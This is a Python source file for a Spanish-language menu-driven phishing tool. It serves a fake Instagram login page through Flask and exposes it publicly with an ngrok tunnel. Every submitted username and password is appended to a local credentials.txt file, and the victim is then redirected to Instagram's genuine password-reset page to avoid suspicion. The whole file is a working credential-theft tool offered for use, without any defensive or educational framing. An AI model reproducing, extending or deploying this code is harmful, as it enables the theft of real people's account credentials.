import argparse
from flask import Flask, request, render_template, redirect
from pyngrok import ngrok

app = Flask(__name__)

def logo():
    """
      _____             ______ _     _     _               
     |_   _|            | ___ \ |   (_)   | |              
       | | ___ _ __ ___ | |_/ / |__  _ ___| |__   ___ _ __ 
       | |/ _ \ '_ ` _ \|  __/| '_ \| / __| '_ \ / _ \ '__|
       | |  __/ | | | | | |   | | | | \__ \ | | |  __/ |   
       \_/\___|_| |_| |_\_|   |_| |_|_|___/_| |_|\___|_|                                               
    """

def display_menu():
    print(logo())
    print("Bienvenido al programa.")
    print("1. Seleccionar template")
    print("2. Seleccionar puerto")
    print("3. Seleccionar servicio de túnel")
    print("4. Iniciar aplicación")
    print("5. Salir")

def get_template_choice():
    print("Selecciona el template:")
    print("1. Instagram")
    print("2. Github (proximamente)")
    choice = input("Ingresa tu opción: ")
    return choice

def get_port_choice():
    port = input("Ingresa el puerto para ejecutar la aplicación (por defecto 5000): ")
    return port

def get_tunnel_choice():
    print("Selecciona el servicio de túnel:")
    print("1. Ngrok")
    choice = input("Ingresa tu opción: ")
    return choice

def load_config(template_choice):
    """ Cargar la configuración de la aplicación """
    template_key = str(template_choice)
    if template_key == '1':
        app.config['TEMPLATE'] = 'index.html'
    elif template_key == '2':
        app.config['TEMPLATE'] = 'github.html'
    else:
        raise ValueError("Opción de template no válida.")

def create_app():
    """ Crear la aplicación Flask """
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            
            # Store credentials in a local file
            with open('credentials.txt', 'a') as f:
                f.write(f"Username: {username}, Password: {password}\n")
            
            # Redirect to Instagram page
            return redirect('https://www.instagram.com/accounts/password/reset/')
        
        return render_template(app.config['TEMPLATE'])

def start_tunnel(tunnel_choice, port):
    """ Iniciar el servicio de túnel """
    tunnel_key = str(tunnel_choice)
    if tunnel_key == '1':
        ngrok_tunnel = ngrok.connect(port)
        print(f'Tunnel started at {ngrok_tunnel.public_url}')
    # add other tunnel options here
    else:
        raise ValueError("Opción de servicio de túnel no válida.")

def main():
    """ Función principal """
    template_choice = None
    port = None
    tunnel_choice = None

    while True:
        display_menu()
        choice = input("Ingresa tu opción: ")

        if choice == '1':
            template_choice = get_template_choice()
        elif choice == '2':
            port = get_port_choice()
        elif choice == '3':
            tunnel_choice = get_tunnel_choice()
        elif choice == '4':
            if template_choice and port and tunnel_choice:
                try:
                    load_config(template_choice)
                    create_app()
                    start_tunnel(tunnel_choice, port)

                    print(f'Servidor Flask corriendo en el puerto {port}.')
                    print('Presiona Ctrl+C para detener el servidor.')

                    app.run(debug=True, port=int(port))
                except ValueError as e:
                    print(f"Error: {e}")
                except KeyboardInterrupt:
                    print('Servidor detenido.')
            else:
                print("Debes seleccionar todas las opciones antes de iniciar la aplicación.")
        elif choice == '5':
            break
        else:
            print("Opción no válida. Inténtalo de nuevo.")

if __name__ == '__main__':
    main()
